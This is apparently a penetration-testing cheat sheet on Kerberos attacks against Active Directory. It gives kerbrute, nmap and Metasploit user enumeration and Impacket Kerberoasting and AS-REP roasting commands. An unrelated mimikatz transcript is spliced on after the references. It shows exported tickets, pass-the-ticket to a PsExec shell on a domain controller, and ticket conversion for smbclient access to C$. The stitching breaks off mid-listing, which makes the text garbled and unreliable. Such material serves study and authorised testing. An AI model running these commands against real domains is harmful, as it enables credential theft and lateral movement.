# Kerberos

## 01 - Manual

### 1.1 - Usage

#### 1.1.1 - Enumerate Users

- **Enumerate users against the active directory**

`$ ./kerbrute userenum --dc <IP> -d <domain_name> users.txt -t 64`

#### 1.1.2 - Kerberoast

^e70af7

- **Request a Kerberos 5 TGS-REP etype 23 hash from an SPN user account**

`$ GetUserSPNs -request -dc-ip <IP> <domain_name>/<username>:<password>`

#### 1.1.3 - ASREPRoast

^7e8f5e

- **Request a Kerberos 5, etype 23, AS-REP hash from an NP user account**

`$ GetNPUsers -request -dc-ip <IP> <domain_name>/<username>:<password>`

`$ GetNPUsers -request -dc-ip <IP> <domain_name> -usersfile users.txt`

## 02 - Nmap

`$ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="<domain_name>",userdb=<usernames.txt> <IP>`

## 03 - Metasploit

### 3.1 - Enumerate Users

```
msf > use auxiliary/gather/kerberos_enumusers

msf auxiliary(gather/kerberos_enumusers) > options

Module options (auxiliary/gather/kerberos_enumusers):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN                      yes       The Domain Eg: demo.local
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      88               yes       The target port
   Timeout    10               yes       The TCP timeout to establish connection and read data
   USER_FILE                   yes       Files containing usernames, one per line

msf auxiliary(gather/kerberos_enumusers) > set domain <domain_name>

msf auxiliary(gather/kerberos_enumusers) > set rhosts <IP>

msf auxiliary(gather/kerberos_enumusers) > set user_file usernames.txt

msf auxiliary(gather/kerberos_enumusers) > exploit -j
```

### 3.2 Kerberoast

```
msf > use auxiliary/gather/get_user_spns

msf auxiliary(gather/get_user_spns) > options

Module options (auxiliary/gather/get_user_spns):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS  1                yes       The number of concurrent threads (max one per host)
   domain                    yes       The target Active Directory domain
   pass                      yes       Password for the domain user account
   user                      yes       Username for a domain account

msf auxiliary(gather/get_user_spns) > set rhosts <IP>

msf auxiliary(gather/get_user_spns) > set threads 4

msf auxiliary(gather/get_user_spns) > set domain <domain_name>

msf auxiliary(gather/get_user_spns) > set user <username>

msf auxiliary(gather/get_user_spns) > set pass <password>

msf auxiliary(gather/get_user_spns) > exploit
```

## References

- [Impacket](https://github.com/fortra/impacket)

- [Kerbrute](https://github.com/ropnop/kerbrute)

- [Kerberoasting Common Tools](https://blog.certcube.com/kerberoasting-common-tools/)

- [Pentesting Kerberos 88](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; f
orwardable ;
   * Saved to file     : 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK
.INFO.kirbi

[00000002] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewa
ble ; forwardable ;
   * Saved to file     : 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDU
CK.INFO.kirbi

[00000003] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : ldap/dc1.sittingduck.info @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewa
ble ; forwardable ;
   * Saved to file     : 3-40a50000-uberuser@ldap~dc1.sittingduck.info-SITTINGDU
CK.INFO.kirbi

[00000004] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : LDAP/dc1.sittingduck.info/sittingduck.info @ SITTINGDUCK.
INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewa
ble ; forwardable ;
   * Saved to file     : 4-40a50000-uberuser@LDAP~dc1.sittingduck.info~sittingdu
ck.info-SITTINGDUCK.INFO.kirbi
```

## PSEXEC with standard Kerberos tickets
```

mimikatz # kerberos::list

mimikatz # (EMPTY LIST)

mimikatz # kerberos::ptt 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK
.INFO.kirbi
  0 - File '1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi'
: OK

mimikatz # kerberos::ptt 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDU
CK.INFO.kirbi
  0 - File '2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
' : OK

mimikatz # kerberos::list

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; f
orwardable ;

[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewa
ble ; forwardable ;

mimikatz #



C:\Users\notanadmin\Desktop>psexec \\dc1 cmd.exe

PsExec v1.97 - Execute processes remotely
Copyright (C) 2001-2009 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
sittingduck\uberuser

C:\Windows\system32>echo %COMPUTERNAME%
DC1

C:\Windows\system32>
```




## Convert Mimikatz Kerberos ticket to CCache and use
```
C:\Users\notanadmin\Desktop>kirbikator.exe ccache "2-40a50000-uberuser@cifs~dc1.
sittingduck.info-SITTINGDUCK.INFO.kirbi"

  .#####.   KiRBikator 1.0 (x86) release "Kiwi en C" (Feb  1 2015 03:37:29)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Destination : MIT Credential Cache (simple)
 < 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi (RFC KRB
-CRED (#22))
 > Single file : uberuser@SITTINGDUCK.INFO.ccache

C:\Users\notanadmin\Desktop>
```

### Method 1

```
KRB5CCNAME=uberuser@SITTINGDUCK.INFO.ccache smbclient -k //dc1.sittingduck.info/c$
OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]
smb: \> 
```

### Method 2
```
root@kali:~# apt-get install krb5-user
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  krb5-config libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-7
Suggested packages:
  krb5-doc
The following NEW packages will be installed:
  krb5-config krb5-user libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-7
0 upgraded, 6 newly installed, 0 to remove and 0 not upgraded.
Need to get 466 kB of archives.
After this operation, 1,199 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
0% [Connecting to http.kali.org]
<SNIP>
<SNIP>
<SNIP>

root@kali:~/Desktop# klist
klist: Credentials cache file '/tmp/krb5cc_0' not found
root@kali:~/Desktop# cp uberuser@SITTINGDUCK.INFO.ccache /tmp/krb5cc_0
root@kali:~/Desktop# smbclient -k //dc1.sittingduck.info/c$
OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]
smb: \> 
```

